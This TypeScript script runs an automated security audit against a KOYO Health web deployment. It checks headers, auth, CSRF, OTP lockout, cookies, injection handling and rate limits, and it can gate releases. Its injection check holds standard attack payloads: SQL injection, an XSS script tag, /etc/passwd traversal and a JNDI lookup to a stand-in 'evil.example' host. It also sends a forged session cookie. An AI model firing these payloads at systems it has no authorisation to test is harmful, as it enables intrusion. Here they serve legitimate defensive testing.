/**
 * Active security audit against a running KOYO Health deployment.
 *
 *   BASE_URL=http://localhost:3200 npx tsx scripts/security-audit.ts
 *
 * Exits non-zero if any check fails, so it can gate a release.
 */
export {}; // module scope: keeps this file's helpers out of the global script namespace

const BASE = (process.env.BASE_URL ?? 'http://localhost:3200').replace(/\/$/, '');

type Check = { name: string; pass: boolean; detail: string };
const checks: Check[] = [];

function record(name: string, pass: boolean, detail: string) {
  checks.push({ name, pass, detail });
  const mark = pass ? '\u001b[32mPASS\u001b[0m' : '\u001b[31mFAIL\u001b[0m';
  console.log(`${mark}  ${name} — ${detail}`);
}

async function get(path: string, init: RequestInit = {}) {
  const res = await fetch(`${BASE}${path}`, { redirect: 'manual', ...init });
  const text = await res.text();
  return { res, text };
}

function post(path: string, body: unknown, headers: Record<string, string> = {}) {
  return fetch(`${BASE}${path}`, {
    method: 'POST',
    redirect: 'manual',
    headers: { 'content-type': 'application/json', ...headers },
    body: typeof body === 'string' ? body : JSON.stringify(body),
  });
}

/**
 * The per-IP limiter is not the subject of the payload checks below, so when a
 * previous scenario has already drained that bucket, wait out the window once
 * and retry instead of reporting the 429 as a parsing failure.
 */
async function afterThrottle(request: () => Promise<Response>) {
  const res = await request();
  if (res.status !== 429) return res;
  await new Promise((resolve) => setTimeout(resolve, 61_000));
  return request();
}

async function headersCheck() {
  const { res } = await get('/');
  const h = res.headers;
  const csp = h.get('content-security-policy') ?? '';
  record('CSP present', csp.includes("default-src 'self'"), csp ? 'policy delivered' : 'missing');
  record('CSP frame-ancestors none', csp.includes("frame-ancestors 'none'"), 'clickjacking blocked');
  record('CSP object-src none', csp.includes("object-src 'none'"), 'plugin content blocked');
  record('X-Frame-Options DENY', h.get('x-frame-options') === 'DENY', String(h.get('x-frame-options')));
  record('X-Content-Type-Options', h.get('x-content-type-options') === 'nosniff', String(h.get('x-content-type-options')));
  record('Referrer-Policy set', Boolean(h.get('referrer-policy')), String(h.get('referrer-policy')));
  record('Permissions-Policy set', Boolean(h.get('permissions-policy')), String(h.get('permissions-policy')));
  record('No X-Powered-By', !h.get('x-powered-by'), 'framework header stripped');
  record('Cross-Origin-Opener-Policy', h.get('cross-origin-opener-policy') === 'same-origin', String(h.get('cross-origin-opener-policy')));
  record('HSTS in production', Boolean(h.get('strict-transport-security')), String(h.get('strict-transport-security') ?? 'absent'));

  const api = await get('/api/health');
  record('API responses are no-store', (api.res.headers.get('cache-control') ?? '').includes('no-store'), String(api.res.headers.get('cache-control')));
  record('API responses are noindex', (api.res.headers.get('x-robots-tag') ?? '').includes('noindex'), String(api.res.headers.get('x-robots-tag')));
}

async function authChecks() {
  const dash = await get('/dashboard');
  record('Dashboard requires auth', dash.res.status >= 300 && dash.res.status < 400 && (dash.res.headers.get('location') ?? '').includes('/login'), `${dash.res.status} → ${dash.res.headers.get('location')}`);

  const report = await get('/dashboard/reports/rpt-4471');
  const reportBody = report.text;
  record(
    'Private report is not served unauthenticated',
    !(report.res.status === 200 && reportBody.includes('LDL cholesterol')),
    `${report.res.status}`,
  );

  const bookings = await get('/api/bookings');
  record('Bookings API requires auth', bookings.res.status === 401, `HTTP ${bookings.res.status}`);

  const me = await get('/api/auth/me');
  record('Session endpoint rejects anonymous callers', me.res.status === 401, `HTTP ${me.res.status}`);

  const tampered = await get('/api/auth/me', { headers: { cookie: 'koyo_session=eyJpZCI6ImF0dGFja2VyIn0.forged' } });
  record('Forged session cookie rejected', tampered.res.status === 401, `HTTP ${tampered.res.status}`);
}

async function csrfChecks() {
  const payload = { name: 'Audit Bot', phone: '9810199821', concern: 'Booking help', consent: true };
  const foreign = await post('/api/callbacks', payload, { origin: 'https://evil.example' });
  record('Cross-origin write blocked (Origin)', foreign.status === 403, `HTTP ${foreign.status}`);

  const crossSite = await post('/api/subscribe', { email: 'audit@example.com' }, { 'sec-fetch-site': 'cross-site' });
  record('Cross-site write blocked (Sec-Fetch-Site)', crossSite.status === 403, `HTTP ${crossSite.status}`);
}

async function otpChecks() {
  const phone = `9${Math.floor(100000000 + Math.random() * 899999999)}`;
  const request = await post('/api/auth/otp', { phone });
  const body = await request.json();
  record('OTP request accepted for valid mobile', request.status === 200 && Boolean(body.demoCode), `HTTP ${request.status}`);

  const statuses: number[] = [];
  for (let i = 0; i < 6; i++) {
    const res = await post('/api/auth/verify', { phone, code: '000000' });
    statuses.push(res.status);
  }
  const budget = statuses.slice(0, 5);
  record('Wrong OTP rejected five times', budget.every((s) => s === 401), budget.join(', '));
  // The sixth guess lands on the lockout, which answers 429 rather than 401.
  const limited = statuses[5] === 429;
  record('OTP brute force is throttled', limited, limited ? `429 on attempt 6 (${statuses.join(', ')})` : 'no 429 observed');

  const locked = await post('/api/auth/verify', { phone, code: body.demoCode });
  record('Correct code cannot rescue a locked OTP', locked.status !== 200, `HTTP ${locked.status}`);
}

async function sessionCookieCheck() {
  const phone = `9${Math.floor(100000000 + Math.random() * 899999999)}`;
  const request = await post('/api/auth/otp', { phone });
  const { demoCode } = (await request.json()) as { demoCode: string };
  const verify = await post('/api/auth/verify', { phone, code: demoCode, name: 'Audit User' });
  const cookie = verify.headers.get('set-cookie') ?? '';
  record('Session cookie is HttpOnly', /httponly/i.test(cookie), 'cookie flag');
  record('Session cookie is SameSite=Lax', /samesite=lax/i.test(cookie), 'cookie flag');
  record('Session cookie is path-scoped', /path=\//i.test(cookie), 'cookie flag');

  const me = await fetch(`${BASE}/api/auth/me`, {
    headers: { cookie: cookie.split(';')[0] },
    redirect: 'manual',
  });
  const meBody = await me.text();
  record('Valid session authenticates', me.status === 200 && meBody.includes('"user"'), `HTTP ${me.status}`);
}

async function injectionChecks() {
  const payloads = [
    "' OR 1=1--",
    '"><script>alert(1)</script>',
    '../../../../etc/passwd',
    '${jndi:ldap://evil.example/a}',
    '%00%00%00',
  ];
  let clean = true;
  for (const payload of payloads) {
    const { res, text } = await get(`/api/tests?q=${encodeURIComponent(payload)}&limit=5`);
    if (res.status >= 500) clean = false;
    if (text.includes('root:x:')) clean = false;
  }
  record('Injection payloads never 5xx or leak files', clean, '5 payloads tested');

  const xss = await get('/services?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E');
  record('Search query is not reflected as raw HTML', !xss.text.includes('<script>alert(1)</script>'), 'no raw script tag');

  const traversal = await get('/.data/bookings.json');
  record('Data directory is not web-accessible', traversal.res.status === 404, `HTTP ${traversal.res.status}`);

  const env = await get('/.env');
  record('Environment files are not served', env.res.status === 404, `HTTP ${env.res.status}`);
}

async function robustnessChecks() {
  const big = await afterThrottle(() =>
    post('/api/callbacks', { name: 'A B', phone: '9810199821', concern: 'Help', message: 'x'.repeat(60_000), consent: true }),
  );
  record('Oversized payload rejected', big.status === 413 || big.status === 422, `HTTP ${big.status}`);

  const wrongType = await afterThrottle(() =>
    fetch(`${BASE}/api/callbacks`, {
      method: 'POST',
      headers: { 'content-type': 'text/plain' },
      body: 'not json at all',
      redirect: 'manual',
    }),
  );
  record('Non-JSON body rejected without a crash', wrongType.status === 400 || wrongType.status === 415, `HTTP ${wrongType.status}`);

  const notFound = await get('/this-page-does-not-exist');
  record('Unknown routes return 404', notFound.res.status === 404, `HTTP ${notFound.res.status}`);

  const put = await fetch(`${BASE}/api/bookings`, { method: 'PUT', redirect: 'manual' });
  record('Unsupported methods return 405', put.status === 405, `HTTP ${put.status}`);

  const bad = await post('/api/bookings', { items: 'not-an-array', consent: 'yes' });
  const badBody = await bad.text();
  record('Malformed booking is rejected cleanly', bad.status === 422, `HTTP ${bad.status}`);
  record('Errors do not leak stack traces', !/at .*\(.*:\d+:\d+\)/.test(badBody) && !badBody.includes('node_modules'), 'no stack frames');

  const robots = await get('/robots.txt');
  record('Robots hides private routes', robots.text.includes('/dashboard/') && robots.text.includes('/api/'), 'disallow rules present');
}

async function rateLimitCheck() {
  let blocked = 0;
  for (let i = 0; i < 10; i++) {
    const res = await post('/api/subscribe', { email: `limit${i}@example.com` });
    if (res.status === 429) blocked += 1;
  }
  record('Public write endpoints are rate limited', blocked > 0, `${blocked} of 10 requests throttled`);
}

async function main() {
  console.log(`\nKOYO Health security audit → ${BASE}\n`);
  try {
    await headersCheck();
    await authChecks();
    await csrfChecks();
    await injectionChecks();
    await robustnessChecks();
    await sessionCookieCheck();
    await otpChecks();
    await rateLimitCheck();
  } catch (error) {
    record('Audit completed', false, error instanceof Error ? error.message : String(error));
  }

  const failed = checks.filter((c) => !c.pass);
  console.log(`\n${checks.length - failed.length}/${checks.length} checks passed.`);
  if (failed.length) {
    console.log('\nFailures:');
    for (const f of failed) console.log(` · ${f.name} — ${f.detail}`);
    process.exit(1);
  }
  process.exit(0);
}

void main();
